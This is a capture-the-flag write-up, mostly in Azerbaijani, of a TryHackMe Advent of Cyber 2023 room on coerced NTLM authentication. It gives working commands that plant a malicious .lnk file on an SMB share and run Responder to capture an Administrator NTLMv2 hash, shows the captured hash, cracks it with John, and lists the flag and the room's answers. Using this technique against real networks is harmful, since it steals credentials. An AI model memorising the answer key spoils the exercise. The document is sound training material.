# NTLMAttack
NetNTLM and NTLM Attack


												TryHackMe - Advent Of Cyber 2023 | Coerced Authentication - NTLM Attack
												=======================================================================



Learning Objectives
-------------------

Şəbəkə fayl paylaşımlarının əsasları
Anlamaq NTLM autentifikasiya
Necə NTLM autentifikasiya məcburi hücumları işləyir
Responder identifikasiya məcburi hücumları üçün necə işləyir
lnk faylları istifadə edərək identifikasiyaya məcbur etmək

Introduction
------------

Bugünkü tapşırıqda biz NTLM autentifikasiyasına və təhdid iştirakçılarının autentifikasiya məcburi hücumlarını necə həyata keçirə biləcəyinə baxacağıq. Təcavüzkarlar identifikasiyanı məcbur etməklə olduqca kritik materiallara giriş əldə etmək üçün istifadə oluna bilən həssas məlumatları üzə çıxara bilərlər. Gəlin içəri girək!

Sharing Is Caring
-----------------

Biz kompüterləri təcrid olunmuş qurğular kimi təsəvvür edirik. Bu müəyyən dərəcədə doğru ola bilər, lakin biz şəbəkələrə qoşulduqda hesablamanın real gücü işə düşür. Bu, olduqca zəhmli şeylərə nail olmaq üçün resursları paylaşmağa başlaya biləcəyimiz yerdir. Korporativ mühitlərdə şəbəkələr və şəbəkə əsaslı resurslar tez-tez istifadə olunur. Məsələn, şəbəkədə hər istifadəçinin öz printerinə ehtiyacı yoxdur. Bunun əvəzinə təşkilat bütün işçilərin paylaşa biləcəyi bir neçə böyük printer ala bilər. Bu, təkcə xərclərə qənaət etmir, həm də administratorlara bu sistemləri daha asan və mərkəzləşdirilmiş şəkildə idarə etməyə imkan verir.

Bunun başqa bir nümunəsi fayl paylaşımlarıdır. Hər bir işçinin yerli fayl nüsxələrinə sahib olması və fləş disklər kimi köhnə üsullarla digər işçilərlə faylları paylaşarkən çılğın versiya nəzarəti yerinə yetirmək əvəzinə, təşkilat şəbəkə fayl paylaşımını yerləşdirə bilər. Fayllar mərkəzi yerdə saxlandığı üçün onlara daxil olmaq və hər kəsin əlində ən son versiyanın olmasını təmin etmək asandır. Administratorlar həmçinin fayl paylaşımlarına yalnız autentifikasiya edilmiş istifadəçilərin daxil ola bilməsini təmin etmək üçün təhlükəsizlik əlavə edə bilərlər. Bundan əlavə, işçilərin yalnız iş roluna əsasən xüsusi qovluqlara və fayllara daxil ola bilməsini təmin etmək üçün giriş nəzarətləri tətbiq oluna bilər.

Bununla birlikdə, qırmızı komandalarla bir təşkilatı isti suya endirə bilən eyni fayl paylaşımlarıdır. Adətən, hər hansı bir işçinin yeni şəbəkə fayl paylaşımı yaratmaq imkanı var. Təhlükəsizliyə nəzarət vasitələri bu paylaşımlara tez-tez tətbiq edilmir və autentifikasiya edilmiş istənilən istifadəçiyə onların məzmununa daxil olmağa imkan verir. Bu iki problemə səbəb ola bilər:

Əgər təhdid aktyoru oxumaq imkanı əldə edərsə, onlar həssas məlumatları ələ keçirə bilərlər. Böyük təşkilatların fayl paylaşımlarında siz tez-tez etimadnamələr və ya həssas müştəri sənədləri kimi maraqlı şeyləri tapa bilərsiniz.
Əgər təhdid aktyoru yazma imkanı əldə edərsə, o, paylaşımda saxlanan məlumatları dəyişdirə, potensial olaraq kritik faylların üzərinə yaza və ya digər hücumları təşkil edə bilər (bu tapşırıqda görəcəyik).
Bu cür hücumlardan hər hansı birini həyata keçirməzdən əvvəl, ilk növbədə şəbəkə fayl paylaşımları üçün autentifikasiyanın necə işlədiyini başa düşməliyik.


NTLM Authentication
-------------------

11-ci günün tapşırığında biz Active Directory (AD) və Kerberos autentifikasiyası haqqında öyrəndik. Fayl paylaşımları tez-tez AD domeninə qoşulmuş serverlərdə və iş stansiyalarında istifadə olunur. Bu, AD-yə fayl paylaşımı üçün girişin idarə edilməsi ilə məşğul olmağa imkan verir. Qoşulduqdan sonra, fayl paylaşımına girişi yalnız hostda olan yerli istifadəçilər deyil; icazələri olan bütün AD istifadəçilərinin də girişi olacaq. 11-ci gündə gördüyümüz kimi, Kerberos autentifikasiyası bu fayl paylaşımlarına daxil olmaq üçün istifadə edilə bilər. Bununla belə, diqqətimizi digər məşhur autentifikasiya protokoluna yönəldəcəyik: NetNTLM və ya NTLM autentifikasiyası.

NTLM autentifikasiyasına keçməzdən əvvəl əvvəlcə Server Mesaj Bloku protokolu haqqında danışmalıyıq. SMB protokolu müştərilərə (məsələn, iş stansiyaları) serverlə (fayl paylaşımı kimi) əlaqə saxlamağa imkan verir. Microsoft AD-dən istifadə edən şəbəkələrdə SMB şəbəkələrarası fayl paylaşımından tutmuş uzaqdan idarəetməyə qədər hər şeyi idarə edir. Sənədi çap etməyə çalışdığınız zaman kompüterinizin aldığı “kağız bitdi” xəbərdarlığı belə SMB protokolunun işidir. Bununla belə, SMB protokolunun əvvəlki versiyalarının təhlükəsizliyi qeyri-kafi hesab edilib. Etibarnamələri bərpa etmək və ya hətta cihazlarda kod icrasını əldə etmək üçün istifadə edilə bilən bir neçə boşluq və istismar aşkar edilib. Bu zəifliklərin bəziləri protokolun daha yeni versiyalarında həll edilsə də, köhnə sistemlər onları dəstəkləmir, buna görə də təşkilatlar nadir hallarda onlardan istifadəni məcbur edir.

NetNTLM, tez-tez Windows Authentication və ya sadəcə NTLM Authentication kimi istinad edilir, proqrama müştəri arasında vasitəçi rolunu oynamağa imkan verir. və AD. NetNTLM Windows-da çox məşhur identifikasiya protokoludur və SMB və RDP daxil olmaqla müxtəlif xidmətlər üçün istifadə olunur. O, AD mühitlərində istifadə olunur, çünki serverlərə (məsələn, şəbəkə fayl paylaşımları) autentifikasiya üçün AD-yə pul ötürməyə imkan verir. Aşağıdakı animasiyada onun necə işlədiyinə nəzər salaq:


Coercing the Connectee
----------------------

Bu tapşırıq üçün biz bir az daha çox diqqəti istifadəçiləri bizə autentifikasiya etməyə məcbur etməyə yönəldəcəyik. İstifadəçilərin çox vaxt zəif parolları olduğundan, bu yanaşma ilə bizim problemlərdən birini sındırmaq və istifadəçi kimi giriş əldə etmək şansımız daha yüksəkdir. İstifadəçilər indi əsasən VPN vasitəsilə fayl paylaşımlarına qoşulurlar, ona görə də biz sadəcə Responder-i işə salıb ən yaxşısına ümid edə bilmirik. Beləliklə, sual qalır: istifadəçiləri nəzarət etdiyimiz bir şeyə autentifikasiya etməyə necə məcbur edə bilərik? Gəlin hamısını bir yerə yığaq.

Şəbəkə fayl paylaşımına (müntəzəm olaraq istifadə olunan) yazma imkanımız varsa, biz həmin istifadəçiləri serverimizə autentifikasiya etməyə məcbur etmək üçün gizli kiçik fayl yarada bilərik. Biz bunu fayl brauzerində baxıldıqda avtomatik olaraq autentifikasiyaya məcbur edəcək bir fayl yaratmaqla edə bilərik. Bunun üçün istifadə edilə bilən bir çox müxtəlif fayl növləri var, lakin onların hamısı eyni şəkildə işləyir: fayl ikonası kimi elementin uzaq yerdən yüklənməsini tələb etməklə identifikasiyanı məcbur etmək. Bu sənədləri yaratmaq üçün ntlm_theft alətindən istifadə edəcəyik. Əgər siz AttackBox-dan istifadə etmirsinizsə, əvvəlcə alətləri yükləməlisiniz. AttackBox-da biz terminalda aşağıdakıları işlətməklə alətləri tapa bilərik:

https://github.com/Greenwolf/ntlm_theft

root@ip-10-10-169-92:~# cd /root/Rooms/AoC2023/Day23/ntlm_theft/
Xüsusi nümunəmiz üçün aşağıdakı əmrdən istifadə edərək lnk faylı yaradacağıq:

root@ip-10-10-169-92:~/Rooms/AoC2023/Day23/ntlm_theft# python3 ntlm_theft.py -g lnk -s 10.10.169.92 -f stealthy
Created: stealthy/stealthy.lnk (BROWSE TO FOLDER)
Generation Complete.

Bu, adlı kataloqunda lnk fayl yaradacaq. Bu fayl ilə biz indi autentifikasiyanı məcbur edə bilərik!stealthystealthy.lnk


McGreedy Much?
--------------

Biz bilirik ki, McGreedy bir az snoopydur. Beləliklə, gəlin lnk faylını şəbəkə paylaşımımıza əlavə edək və ümid edirik ki, o, bizim tələmizə düşəcək. Sevimli fayl redaktorunuzdan istifadə edin, siz bizim yaratdığımız lnk faylı yoxlaya bilərsiniz. İndi identifikasiyanı məcbur etmək üçün bu faylı şəbəkə fayl paylaşımına əlavə edəcəyik. \\10.10.150.25\ElfShare\-də şəbəkə fayl paylaşımına qoşulun. Aşağıda göstərildiyi kimi qoşulmaq üçün smbclient istifadə edə bilərsiniz:

root@ip-10-10-169-92:~/Rooms/AoC2023/Day23/ntlm_theft# ls
docs  LICENSE  ntlm_theft.py  README.md  stealthy  templates
root@ip-10-10-169-92:~/Rooms/AoC2023/Day23/ntlm_theft# cd stealthy/
root@ip-10-10-169-92:~/Rooms/AoC2023/Day23/ntlm_theft/stealthy# ls
stealthy.lnk
root@ip-10-10-169-92:~/Rooms/AoC2023/Day23/ntlm_theft/stealthy# smbclient //10.10.150.25/ElfShare/ -U guest%
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> put stealthy.lnk
putting file stealthy.lnk as \stealthy.lnk (117.4 kb/s) (average 117.4 kb/s)
smb: \> dir
  .                                   D        0  Sun Dec 24 11:22:21 2023
  ..                                  D        0  Sun Dec 24 11:22:21 2023
  EXCO                                D        0  Wed Nov 22 11:07:20 2023
  greedykeys.txt                      A     2446  Thu Nov 23 17:50:09 2023
  HR                                  D        0  Wed Nov 22 11:06:57 2023
  IT                                  D        0  Wed Nov 22 11:07:02 2023
  SALES                               D        0  Wed Nov 22 11:07:05 2023
  stealthy.lnk                        A     2164  Sun Dec 24 11:22:21 2023
  SUPPORT                             D        0  Thu Nov 23 10:28:06 2023

		7863807 blocks of size 4096. 3837362 blocks available

Birinci komanda sizi qonaq kimi paylaşıma bağlayacaq. İkinci komanda faylınızı yükləyəcək, üçüncü əmr isə yoxlama üçün bütün faylları siyahıya alacaq. Sonra, gələn autentifikasiya cəhdlərini dinləmək üçün Responder-i işə salmalıyıq. Bunu terminal pəncərəsindən aşağıdakı əmri işlətməklə edə bilərik:

root@ip-10-10-169-92:~/Rooms/AoC2023/Day23/ntlm_theft/stealthy# responder -I ens5
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [ens5]
    Responder IP               [10.10.169.92]
    Responder IPv6             [fe80::1c:2dff:fed8:5865]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-K0J085MZ0DI]
    Responder Domain Name      [GA2I.LOCAL]
    Responder DCE-RPC Port     [45492]

[+] Listening for events...

[!] Error starting TCP server on port 80, check permissions or other servers running.
[!] Error starting TCP server on port 3389, check permissions or other servers running.
[!] Error starting TCP server on port 389, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : ::ffff:10.10.150.25
[SMB] NTLMv2-SSP Username : ELFHQSERVER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::ELFHQSERVER:34b2e3989827c485:FD7BD126B0F5D1B393F15540B31ABC61:0101000000000000805328965B36DA0144D3B1CA509A62520000000002000800470041003200490001001E00570049004E002D004B0030004A003000380035004D005A0030004400490004003400570049004E002D004B0030004A003000380035004D005A003000440049002E0047004100320049002E004C004F00430041004C000300140047004100320049002E004C004F00430041004C000500140047004100320049002E004C004F00430041004C0007000800805328965B36DA0106000400020000000800300030000000000000000000000000300000716C67F344640DB3DBE6001310A28450004DE70716AB43A527C9B0EBDBEF1BCB0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E003100360039002E00390032000000000000000000
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
[*] Skipping previously captured hash for ELFHQSERVER\Administrator


Gəlin Makqrediyə bir neçə dəqiqə vaxt verək. O, hazırda isti şokolad fasiləsi verə bilər, lakin biz ondan beş dəqiqədən az vaxt ərzində cavab almalıyıq. Gözlədiyimiz müddətdə get greedykeys.txt istifadə edərək, onun bizə ipucu kimi buraxdığı açar siyahısını endirmək üçün şəbəkə fayl paylaşımı ilə bağlantınızdan istifadə edin. O, təsdiq etdikdən sonra Cavab verəndə aşağıdakıları görəcəksiniz:


root@ip-10-10-169-92:~/Rooms/AoC2023/Day23/ntlm_theft/stealthy# john --wordlist=greedykeys.txt hash.txt
Username = Administrator

Password = GreedyGrabber1@

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----       11/23/2023   6:09 PM             40 flag.txt


PS C:\Users\Administrator\Desktop> type .\flag.txt
THM{Greedy.Greedy.McNot.So.Great.Stealy}


What is the name of the AD authentication protocol that makes use of tickets?
Answer: Kerberos

What is the name of the AD authentication protocol that makes use of the NTLM hash?
Answer: NetNTLM

What is the name of the tool that can intercept these authentication challenges?
Answer: responder

What is the password that McGreedy set for the Administrator account?
Answer: GreedyGrabber1@

What is the value of the flag that is placed on the Administrator’s desktop?
Answer: THM{Greedy.Greedy.McNot.So.Great.Stealy}
